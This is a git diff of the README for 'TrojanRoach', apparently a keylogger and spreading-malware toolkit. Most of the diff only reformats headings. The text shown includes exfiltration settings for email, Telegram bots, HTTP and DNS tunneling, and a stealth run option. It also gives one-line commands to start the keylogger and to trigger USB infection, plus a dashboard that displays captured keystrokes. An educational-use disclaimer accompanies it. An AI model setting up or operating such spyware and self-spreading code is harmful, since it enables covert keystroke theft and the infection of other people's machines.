@@ -453,7 +453,7 @@ python -m venv venv
 # Install dependencies
 pip install -r requirements.txt
 
-Requirements File
+#Requirements File
 
 pywin32==306
 paramiko==3.3.1
@@ -471,8 +471,8 @@ dropbox==12.0.0
 google-api-python-client==2.108.0
 websockets==12.0
 
-Configuration
-Email Settings
+#Configuration
+##Email Settings
 EMAIL_CONFIG = {
     'smtp_server': 'smtp.gmail.com',
     'smtp_port': 587,
@@ -481,7 +481,8 @@ EMAIL_CONFIG = {
     'recipient': 'recipient@gmail.com'
 }
 
-Telegram Settings
+##Telegram Settings
+
 TELEGRAM_CONFIG = {
     'bot_token': '123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11',  # From @BotFather
     'chat_id': '123456789'  # From @userinfobot
@@ -496,7 +497,7 @@ HTTP_CONFIG = {
     ]
 }
 
-DNS Tunneling
+##DNS Tunneling
 
 DNS_CONFIG = {
     'domain': 'your-domain.com'  # Your controlled domain
@@ -506,12 +507,9 @@ DNS_CONFIG = {
     'domain': 'your-domain.com'  # Your controlled domain
 }
 
-DNS_CONFIG = {
-    'domain': 'your-domain.com'  # Your controlled domain
-}
 
-🚀 Usage
-Basic Usage
+#🚀 Usage
+#Basic Usage
 
 # Run with default settings
 python main.py
@@ -525,7 +523,7 @@ python main.py --stealth
 # Run with debug output
 python main.py --debug
 
-Command Line Options
+##Command Line Options
 
 python main.py [-h] [--config CONFIG] [--stealth] [--debug] [--no-dashboard]
 
@@ -536,7 +534,7 @@ Options:
   --debug              Enable debug logging
   --no-dashboard       Disable web dashboard
 
-Testing Individual Modules
+#Testing Individual Modules
 
 # Test Keylogger only
 python -c "from core import Keylogger; k = Keylogger(); k.start(); import time; time.sleep(10); k.stop()"
@@ -550,10 +548,10 @@ python -c "from transmission import HybridTransmission; t = HybridTransmission()
 # Test USB Spread
 python -c "from spread import USBSpread; USBSpread().infect()"
 
-📂 Modules
-Core Modules (/core/)
+#📂 Modules
+#Core Modules (/core/)
 
-Module	Description
+#Module	Description
 keylogger.py	Keyboard capture and processing
 detector.py	Pattern and anomaly detection
 analyzer.py	Behavioral and temporal analysis
@@ -858,8 +856,8 @@ Dashboard Screens
 │  │ 12:34:22  [ENTER]               │    │ Command     ││
 │  └─────────────────────────────────┘    └─────────────┘│
 └──────────────────────────────────────────────────────────┘
-⚠️ Disclaimer
-IMPORTANT LEGAL NOTICE
+#⚠️ Disclaimer
+#IMPORTANT LEGAL NOTICE
 
 TrojanRoach is designed for educational, research, and authorized testing purposes only.
 
@@ -913,8 +911,9 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
-🤝 Contributing
-Fork the repository
+
+#🤝 Contributing
+##Fork the repository
 
 Create your feature branch (git checkout -b feature/amazing-feature)
 
